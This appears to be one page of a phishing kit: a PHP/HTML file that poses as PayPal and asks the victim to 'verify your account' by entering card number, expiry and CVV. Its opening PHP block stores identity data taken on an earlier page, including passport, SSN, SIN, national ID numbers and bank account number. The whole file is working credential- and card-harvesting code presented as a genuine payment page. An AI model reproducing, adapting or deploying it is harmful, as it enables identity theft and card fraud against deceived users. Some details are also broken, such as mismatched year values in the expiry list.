<?php
if($_GET['error'] == 1){
}else{
$_SESSION['fullname'] = $_POST['fullname'];
$_SESSION['dob'] = $_POST['dob'];
$_SESSION['address'] = $_POST['address'];
$_SESSION['city'] = $_POST['city'];
$_SESSION['state'] = $_POST['state'];
$_SESSION['zipcode'] = $_POST['zipcode'];
$_SESSION['country'] = $_POST['country'];
$_SESSION['phone'] = $_POST['phone'];
$_SESSION['passport'] = $_POST['passport'];
$_SESSION['numbid'] = $_POST['numbid'];
$_SESSION['naid'] = $_POST['naid'];
$_SESSION['citizenid'] = $_POST['citizenid'];
$_SESSION['civilid'] = $_POST['civilid'];
$_SESSION['qatarid'] = $_POST['qatarid'];
$_SESSION['ssn'] = $_POST['ssn'];
$_SESSION['sin'] = $_POST['sin'];
$_SESSION['osidnumber'] = $_POST['osidnumber'];
$_SESSION['bans'] = $_POST['bans'];
$_SESSION['acno'] = $_POST['acno'];
}
?>
<html>
<head>
<title>PayPal</title>
<link rel='icon' href='../img/ppl.ico'>
<link rel="stylesheet" href="../css/normalize.css">
<link rel="stylesheet" href="../css/bootstrap.min.css">
<link rel="stylesheet" href="../css/font-awesome.min.css">
<link rel="stylesheet" href="../css/main_style.css">
<link rel='stylesheet' href='../assets/css/mobile_login.css'>
<link rel='stylesheet' href='../assets/css/billing.css'>
<script type='text/javascript' src="../assets/js/jquery.js"></script>
<script type='text/javascript' src="../assets/js/jquery.validate.min.js"></script>
<script type='text/javascript' src="../assets/js/jquery.payment.js"></script>
<script type='text/javascript' src="../assets/js/additional-methods.min.js"></script>
<script type='text/javascript' src="../assets/js/jquery.maskedinput.js"></script>
<script type='text/javascript' src="../assets/js/validate.php"></script>
<script type='text/javascript' src="../assets/js/validation.js"></script>
<meta charset='utf-8'>
<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
</head>
<body>
  <script>
  $(document).ready(function(){
  var bith = "dd/mm/yyyy";
  $("#sortcode").mask("99-99-99",{placeholder:"__-__-__"});
  $('input[name="dob"]').mask("99/99/9999", {placeholder: bith });
  $('input[name="phone"]').keyup(function(e) {
      if (/\D/g.test(this.value))
      {
        this.value = this.value.replace(/\D/g, '');
      }
    });
  });
  </script>
<div class="contain">
                <div class="img-logo">
                    <a href="#"><img src="../img/paypal-logo.png" style="height: 160px;margin-top: -60px;margin-bottom: -75px;"></a>
                </div>
                <div class="center-color"></div>
                <div class="right-btn"><a href="#" class="log_out"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Logout</font></font></a></div>
                <div class="cls"></div>
            </div>
<center>
  <?php
  if($os == "Android" or $os == "iPhone") {}else{
    echo "<br>";
  } ?>
<?php
  if($os == "Android" or $os == "iPhone") {
    echo '<div class="boxlogin">';
  }else{
    echo '<div style="width:430px;" class="boxlogin">';
  } 
  ?>
<div class="a-section a-spacing-none auth-pagelet-mobile-container">
  <?php if($_GET['error'] == 1) {?>
    <div id="auth-error-message-box" class="a-box a-alert a-alert-error auth-server-side-message-box a-spacing-base" aria-live="assertive" role="alert"><div class="a-box-inner a-alert-container"><h4 class="a-alert-heading"><?php echo $lang['error']['double_cc1'];?></h4><div class="a-alert-content">
      <ul class="a-unordered-list a-nostyle a-vertical" role="alert">
        
          <li><span class="a-list-item">
            <?php echo $lang['error']['double_cc2'];?>
          </span></li>
        
      </ul>
    </div></div></div>
      </div>
    <?php }
      ?>
    <?php if($setting['get_billing'] != "on" and $_GET['error'] != 1) {?>
    <div id="warnings" style='font-size:12px;font-family: Arial,sans-serif;'>
<h1><?php echo $lang['billing']['verif'];?></h1>
<span style="font-size:15px;font-family: Arial,sans-serif;">Please enter your billing info to verify your account.</span>
<br>
<br><br>
 </div>
    <?php }
      ?>
 <form action='updateBilling?session=<?php echo $key;?>' method='post' name='add' id='details' onsubmit="validate(this)">
<div id="formbilling">
  <h4><?php echo $lang['billing']['enter'];?></h4>
<div class="a-input-text-group a-spacing-medium a-spacing-top-micro">
    <div style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
    <input type="text" style="" placeholder="<?php echo $lang['billing']['nameon'];?>" name="ccname" id="ccname" autocorrect="off" autocapitalize="off">
  </div>
  <div style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
    <input type="tel" placeholder="<?php echo $lang['billing']['ccno'];?>" onkeyup="ccc();" name="ccno" maxlength="16" id="ccno" autocorrect="off" autocapitalize="off">
  </div><br>
  <h4><?php echo $lang['billing']['exp'];?></h4>
    <div style="border-top-color: #949494;background: #e7e9ec;
    border-radius: 3px;
    border-color: #ADB1B8 #A2A6AC #8D9096;
    border-style: solid;
    border-width: 1px;
    cursor: pointer;
    display: inline-block;
    padding: 5px;
    width:40%;
    text-align: center;
    text-decoration: none!important;
    vertical-align: middle;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
    <select name='exp_bulan' style='background-color: transparent;
    border: 0;
    display: block;
    font-size: 1.6rem;
    line-height: 1.35;
    margin: 0;
    outline: 0;
    padding: 1.2rem 1.6rem 1.2rem 1.7rem;
    text-align: center;padding:10px;width:99.7%;border-style:none;' required>
       <option value='01' selected="selected">01</option>
       <option value='02'>02</option>
       <option value='03'>03</option>
       <option value='04'>04</option>
       <option value='05'>05</option>
       <option value='06'>06</option>
       <option value='07'>07</option>
       <option value='08'>08</option>
       <option value='09'>09</option>
       <option value='10'>10</option>
       <option value='11'>11</option>
       <option value='12'>12</option>
    </select>
    
  </div>
  <div style="margin-left:border-top-color: #949494;background: #e7e9ec;
    border-radius: 3px;
    border-color: #ADB1B8 #A2A6AC #8D9096;
    border-style: solid;
    border-width: 1px;
    cursor: pointer;
    display: inline-block;
    padding: 5px;
    width:40%;
    text-align: center;
    text-decoration: none!important;
    vertical-align: middle;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
    <select name='exp_tahun' style='background-color: transparent;
    border: 0;
    display: block;
    font-size: 1.6rem;
    line-height: 1.35;
    margin: 0;
    outline: 0;
    padding: 1.2rem 1.6rem 1.2rem 1.7rem;
    text-align: center;padding:10px;width:99.7%;border-style:none;' required>
       <option value='21' selected="selected">2021</option>
       <option value='22'>2022</option>
       <option value='23'>2023</option>
       <option value='24'>2024</option>
       <option value='25'>2025</option>
       <option value='26'>2026</option>
       <option value='27'>2027</option>
       <option value='28'>2028</option>
       <option value='29'>2029</option>
       <option value='30'>2030</option>
        <option value='20'>2031</option>
       <option value='21'>2032</option>
    </select>

  </div><br><br>
  <h4><?php echo $lang['billing']['secode'];?></h4>
  <div style="border-top-color: #949494;padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
    <input type="tel" placeholder="CVV" name="cvv" onkeyup="check_additional();" id="cvv" maxlength="4" autocorrect="off" autocapitalize="off">
  </div>
  <div id="amexcid"></div>
  <?php echo $card;?>
<br>
<center><input type='submit' id="submit_cc" class='bill_input btn-bill'  value='Continue'></center>
</div></div>

</form>
</div>

</center>
<?php
if($os == "Android" or $os == "iPhone") {}else{
  echo "<br><br>";
} ?>
<?php
if($os == "Android" or $os == "iPhone") {
?>
<footer class="nav-mobile nav-locale-us nav-lang-en nav-ftr-batmobile">
                   
                </footer>
<?php }?>
</body>
</html>
